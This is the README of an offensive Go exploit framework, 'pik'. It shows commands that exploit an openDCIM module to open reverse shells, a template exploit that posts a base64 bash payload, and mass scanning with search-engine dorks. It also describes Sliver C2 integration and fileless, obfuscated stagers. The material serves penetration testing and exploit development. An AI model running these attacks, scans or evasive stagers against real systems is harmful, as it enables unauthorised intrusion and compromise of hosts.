# pik

Go exploit framework with a standalone SDK. Write exploits once, run them as standalone binaries or inside the framework with a console, session manager, C2 integration, and multi-arch stagers.

## Install

```bash
go install github.com/Chocapikk/pik/cmd/pik@latest
```

Or from source:

```bash
git clone https://github.com/Chocapikk/pik && cd pik
make build
```

## Quick start

```bash
# Check a target
pik check exploit/http/linux/opendcim -t http://target

# Exploit with reverse shell
pik run exploit/http/linux/opendcim -t http://target -s LHOST=10.0.0.1

# Interactive console
pik console

# Module info with search engine dorks
pik info exploit/http/linux/opendcim

# Version
pik --version
```

## SDK - Write your own exploits

The SDK re-exports framework internals as a single import. Standalone binaries include check, exploit, reverse shell listener, and colored output in ~6 MB.

```bash
pik new myexploit
cd myexploit
go mod init myexploit
go get github.com/Chocapikk/pik/sdk
go build .
./myexploit -t http://target -check
```

### Minimal exploit

```go
package main

import "github.com/Chocapikk/pik/sdk"

type MyExploit struct{ sdk.Pik }

func (m *MyExploit) Info() sdk.Info {
    return sdk.Info{
        Description:    "Example exploit",
        Authors:        []string{"you"},
        DisclosureDate: "2026-01-15",
        Reliability:    sdk.Typical,
        Stance:         sdk.Aggressive,
        Notes: sdk.Notes{
            Stability:   []string{sdk.CrashSafe},
            SideEffects: []string{sdk.IOCInLogs},
        },
        References: []sdk.Reference{
            sdk.CVE("2026-XXXXX"),
            sdk.VulnCheck("advisory-slug"),
        },
        Queries: []sdk.Query{
            sdk.Shodan(`http.title:"myapp"`),
            sdk.FOFA(`title="myapp"`),
        },
        Targets: []sdk.Target{sdk.TargetLinux("amd64")},
    }
}

func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
    resp, err := run.Send(sdk.Request{Path: "vulnerable"})
    if err != nil {
        return sdk.CheckResult{Code: sdk.CheckUnknown}, err
    }
    if resp.ContainsAny("vulnerable_marker") {
        return sdk.CheckResult{Code: sdk.CheckVulnerable, Reason: "marker found"}, nil
    }
    return sdk.CheckResult{Code: sdk.CheckSafe}, nil
}

func (m *MyExploit) Exploit(run *sdk.Context) error {
    cmd := run.CommentTrail(run.Base64Bash(run.Payload()))
    _, err := run.Send(sdk.Request{
        Method: "POST",
        Path:   "rce",
        Form:   sdk.Values{"cmd": {cmd}},
    })
    return err
}

func main() {
    sdk.Run(&MyExploit{})
}
```

Build and run:

```bash
go build -o myexploit .
./myexploit -t http://target -lhost 10.0.0.1
```

### SDK reference

**Context helpers** available in `Check()` and `Exploit()` via `run`:

| Method | Description |
|--------|-------------|
| `run.Send(sdk.Request{...})` | Send HTTP request (path joined to TARGETURI) |
| `run.Payload()` | Get the reverse shell command |
| `run.Base64Bash(cmd)` | Base64 encode + bash wrapper |
| `run.CommentTrail(cmd)` | Append ` #` to neutralize trailing args |
| `run.RandText(n)` | Random alphabetic string |
| `run.Elapsed(true/false)` | Timer for time-based detection |
| `run.Get(key)` | Read option value (TARGETURI, etc.) |
| `run.Status/Success/Warning/Error(fmt, ...)` | Colored output |

**Info metadata**:

| Field | Description |
|-------|-------------|
| `Description` | One-liner for module lists |
| `Detail` | Longer description (use `sdk.Dedent`) |
| `Authors` | List of author names |
| `DisclosureDate` | ISO 8601 date string |
| `Reliability` | `sdk.Unstable` through `sdk.Certain` |
| `Stance` | `sdk.Aggressive` or `sdk.Passive` |
| `Notes` | Stability, side effects, reliability tags |
| `References` | `sdk.CVE()`, `sdk.VulnCheck()`, `sdk.GHSA()`, `sdk.EDB()`, `sdk.URL()` |
| `Queries` | Search engine dorks with auto-generated URLs |
| `Targets` | `sdk.TargetLinux("amd64", "arm64")` |

**Search engine dorks**:

```go
Queries: []sdk.Query{
    sdk.Shodan(`http.title:"myapp"`),
    sdk.FOFA(`title="myapp"`),
    sdk.ZoomEye(`title="myapp"`),
    sdk.Censys(`services.http.response.html_title:"myapp"`),
    sdk.LeakIX(`"myapp"`, "service"),
    sdk.Google(`intitle:"myapp"`),
},
```

## Framework features

### Console with session management

Interactive REPL with tab completion, fuzzy module search, and multi-session support:

```
pik > use opendcim
pik exploit/http/linux/opendcim > set TARGET http://target
pik exploit/http/linux/opendcim > set LHOST 10.0.0.1
pik exploit/http/linux/opendcim > exploit
[*] Session 1 opened (10.0.0.2:49326)
[*] Interacting with session 1
www-data@target:~$ ^Z
[*] Session 1 backgrounded
pik exploit/http/linux/opendcim > sessions
  ID      Remote Address             Opened
  1       10.0.0.2:49326             14:32:05
pik exploit/http/linux/opendcim > sessions 1
pik exploit/http/linux/opendcim > kill 1
```

Ctrl+Z backgrounds a session. Multiple sessions can be active simultaneously on the same listener.

### Build standalone binaries

Extract a single exploit from the framework into a self-contained binary:

```bash
pik build exploit/http/linux/opendcim -o opendcim
./opendcim -t http://target -check
```

### Mass scanning

```bash
pik check exploit/http/linux/opendcim -f targets.txt -t 50 -o vulnerable.txt
```

### C2 integration

Supports Sliver C2 for implant generation, staging, and session management:

```bash
pik run exploit/http/linux/opendcim -t http://target \
    -s LHOST=10.0.0.1 -s C2=sliver -s C2CONFIG=~/.sliver/configs/operator.cfg
```

### CmdStager delivery

Chunk binary payloads through limited injection vectors:

```bash
pik run exploit/http/linux/opendcim -t http://target \
    -s LHOST=10.0.0.1 -s DELIVERY=cmdstager -s CMDSTAGER=printf
```

Supports `printf`, `bourne` flavors, and TCP stagers with multi-arch support (amd64, arm64, 386).

### TCP stagers

Pure Go, hand-assembled shellcode stagers for Linux. Fileless execution via `memfd_create` + `execveat`, XOR-encrypted payload stream, fake ELF section headers, obfuscated syscall numbers.

| Arch | Size |
|------|------|
| amd64 | ~740 B |
| arm64 | ~750 B |
| 386 | ~600 B |

## Architecture

```
pik/
  cmd/pik/              Main binary
  sdk/                  Public SDK (types, interfaces, constructors)
    exploit.go          Exploit/Checker/CmdStager interfaces
    info.go             Info, Reliability, CheckCode, Target, Notes
    reference.go        CVE/GHSA/EDB/VulnCheck references
    query.go            Search engine dorks
    context.go          Execution context (HTTP, logging, payload)
    run.go              sdk.Run() standalone entry point
  modules/              Exploit modules (import only sdk)
  pkg/
    cli/                CLI commands (check, run, build, new, info)
    console/            Interactive REPL with session commands
    runner/             Execution engine
    c2/
      session/          Session manager (accept loop, registry)
      shell/            Built-in TCP reverse shell listener
      sliver/           Sliver C2 backend
    stager/             TCP stager generation
    http/               HTTP client with TARGETURI, pooling
    payload/            Payload encoding/wrapping
    cmdstager/          Chunked command delivery
    output/             Colored terminal output
    log/                ANSI log helpers
    text/               Random string generation
    toolchain/          Module scaffolding templates
```

## Development

```bash
# Build
make build

# Build with version
make build VERSION=1.0.0

# Run tests
make test

# Vet
make vet
```

Types and interfaces are defined directly in `sdk/`. Internal packages import `sdk` for types - no re-export layer, no code generation.

## License

AGPL-3.0
